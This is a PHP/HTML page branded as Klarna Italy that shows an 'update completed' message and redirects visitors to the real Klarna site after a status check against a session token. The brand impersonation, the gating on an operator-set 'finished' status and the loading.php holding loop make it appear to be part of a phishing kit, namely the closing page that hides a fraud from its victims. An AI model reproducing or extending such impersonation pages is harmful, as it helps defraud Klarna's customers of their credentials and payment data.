<?php
require_once __DIR__ . '/guard.php';

$clientData = getClientData(getToken());
$status = $clientData['status'] ?? '';
$allowed = ['finished', 'finished_success'];
if (!in_array($status, $allowed)) {
    header('Location: loading.php');
    exit;
}

$redirectUrl = 'https://www.klarna.com/it/';
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klarna | Completato</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { background-color: #f7f7f7; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .auth-card { width: 100%; max-width: 550px; background: white; padding: 36px 52px; border-radius: 32px; box-shadow: 0 8px 28px rgba(0,0,0,0.04); min-height: 780px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        @media (max-width: 640px) { body { background-color: white; } .auth-card { max-width: 100%; height: 100vh; min-height: 100vh; border-radius: 0; padding: 16px 20px; box-shadow: none; } }
    </style>
</head>
<body>
    <div class="auth-card">
        <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-4xl mb-6">
            <i class="fa-solid fa-check"></i>
        </div>
        <h1 class="text-[28px] font-bold text-[#080516] mb-2">Aggiornamento completato</h1>
        <p class="text-[14px] text-[#5e5e6e]">Grazie per la pazienza.</p>
        <p class="text-[12px] text-[#8a8a96] mt-4">Reindirizzamento in corso...</p>
    </div>

    <script>
        setTimeout(function() {
            window.location.href = '<?php echo $redirectUrl; ?>';
        }, 5000);
    </script>
</body>
</html>